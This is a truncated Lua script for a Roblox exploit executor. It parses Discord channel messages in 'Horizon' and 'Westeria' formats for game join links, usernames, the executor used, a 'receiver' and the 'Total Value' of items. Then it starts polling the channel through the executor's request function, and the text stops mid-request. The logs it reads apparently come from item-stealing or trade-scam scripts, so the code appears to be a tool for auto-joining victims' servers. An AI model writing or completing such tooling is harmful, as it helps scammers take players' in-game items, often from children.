-- ┌─────────────────────────────────────────────────────┐
-- │  FIXED: handles both Horizon's original format AND  │
-- │  Westeria's plsbrainrot.me join link format         │
-- └─────────────────────────────────────────────────────┘
local function getScript(text)
    -- original horizon format: TeleportToPlaceInstance(pid, "jid")
    local pid, jid = text:match('TeleportToPlaceInstance%((%d+),%s*"([%w%-]+)"%)')
    if pid and jid then return tonumber(pid), jid end

    -- westeria / plsbrainrot format: placeId=N&gameInstanceId=UUID
    local pid2, jid2 = text:match("placeId=(%d+)&gameInstanceId=([%w%-]+)")
    if pid2 and jid2 then return tonumber(pid2), jid2 end

    return nil, nil
end

-- ┌─────────────────────────────────────────────────────┐
-- │  FIXED: lowercased scan so "Username:" matches      │
-- │  Added "Tradeable Value:" fallback for totalValue   │
-- └─────────────────────────────────────────────────────┘
local function getUserInfo(msg)
    local info = {}
    local text = ""

    if msg.content then text = text .. msg.content .. "\n" end

    if msg.embeds then
        for _, embed in ipairs(msg.embeds) do
            if embed.title then text = text .. embed.title .. "\n" end
            if embed.description then text = text .. embed.description .. "\n" end
            if embed.fields then
                for _, field in ipairs(embed.fields) do
                    text = text .. field.name .. ": " .. field.value .. "\n"
                end
            end
        end
    end

    if msg.components then
        for _, component in ipairs(msg.components) do
            if component.components then
                for _, child in ipairs(component.components) do
                    if child.text then text = text .. child.text .. "\n" end
                end
            end
        end
    end

    -- lowercase the full text blob so both "username:" and "Username:" match
    local ltext = text:lower()

    info.username  = ltext:match("username%s*:%s*([%w_]+)")
    info.display   = ltext:match("display%s*:%s*([%w_]+)")
    info.executor  = ltext:match("executor%s*:%s*([%w_]+)")
    info.receiver  = ltext:match("receiver%s*:%s*([%w_]+)")

    -- original Horizon format: **Total Value**\n**$N**
    info.totalValue = text:match("%*%*Total Value%*%*\n%*%*%$([%d.]+)%*%*")

    -- Westeria format: Tradeable Value: N  (inside Stats code block)
    if not info.totalValue then
        info.totalValue = ltext:match("tradeable value%s*:%s*(%d+)")
    end

    return info
end

local function getLatestMessages()
    local res = request({
        Url = "https://discord.com/api/v10/channels/" .. channelId .. "/messages?limit=5",
        Method = "GET",
        Headers = {
